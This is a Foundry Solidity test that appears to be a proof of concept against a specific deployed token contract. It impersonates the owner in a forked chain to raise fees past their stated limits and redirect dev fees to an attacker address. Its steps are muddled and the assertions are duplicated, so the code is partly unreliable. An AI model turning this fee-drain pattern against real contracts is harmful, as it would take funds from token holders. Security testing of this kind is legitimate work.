// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for Milesinu contract
interface Milesinu {
    function owner() external view returns (address);
    function setTaxFeePercent(uint256) external;
    function setLiquidityFeePercent(uint256) external;
    function setDevFeePercent(uint256) external;
    function setDevAddress(address payable) external;
    function setSwapAndLiquifyEnabled(bool) external;
    function setExcludeFromMaxTx(address, bool) external;
    function excludeFromFee(address) external;
    function includeInFee(address) external;
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9eFEabD1ae9Fe1e777ebe4D1e271510622b65711;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use fork mode and impersonate the owner
        // The test file already defines TARGET and attacker
        // We need to find the owner address first
        address owner = Milesinu(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Give attacker some initial ETH to work with
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the current owner
        address owner = Milesinu(TARGET).owner();

        // Step 2: Impersonate owner to set fees
        vm.startPrank(owner);

        // Set all fees to 30% (exceeding 25% each)
        Milesinu(TARGET).setTaxFeePercent(30);
        Milesinu(TARGET).setLiquidityFeePercent(30);
        Milesinu(TARGET).setDevFeePercent(30);

        // Set DevAddress to attacker
        Milesinu(TARGET).setDevAddress(payable(attacker));

        // Enable swapAndLiquify
        Milesinu(TARGET).setSwapAndLiquifyEnabled(true);

        // Also need to exclude attacker from max tx to avoid limits
        Milesinu(TARGET).setExcludeFromMaxTx(attacker, true);

        // Also exclude from fees so we don't pay fees when getting tokens
        Milesinu(TARGET).excludeFromFee(attacker);

        vm.stopPrank();

        // Step 3: Get some tokens for the attacker
        // First, get tokens from owner (owner has all supply)
        vm.prank(owner);
        Milesinu(TARGET).transfer(attacker, 1000 * 10**9); // Transfer some tokens

        // Step 4: Record initial ETH balance
        uint256 initialBalance = address(attacker).balance;

        // Step 5: Trigger fee collection by transferring tokens
        // Need to transfer enough to trigger swapAndLiquify (numTokensSellToAddToLiquidity = 50 * 10**6 * 10**9)
        // But we can just do a regular transfer to accumulate fees in contract
        // First, remove fee exclusion so we pay fees
        vm.prank(owner);
        Milesinu(TARGET).includeInFee(attacker);

        // Now transfer tokens to trigger fee collection
        // Create a recipient address
        address recipient = address(0x123);

        // Transfer tokens from attacker to recipient (this will charge fees)
        vm.prank(attacker);
        Milesinu(TARGET).transfer(recipient, 500 * 10**9);

        // Step 6: Manually trigger swapAndLiquify if needed
        // Check contract token balance
        uint256 contractBalance = Milesinu(TARGET).balanceOf(TARGET);
        if (contractBalance > 0) {
            // The contract should automatically process fees when conditions are met
            // We can trigger another transfer to meet the threshold
            vm.prank(attacker);
            Milesinu(TARGET).transfer(recipient, 10000 * 10**9);
        }

        // Step 7: Check if attacker received ETH
        uint256 finalBalance = address(attacker).balance;
        assertGt(finalBalance, initialBalance, "Attacker ETH balance should have increased");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

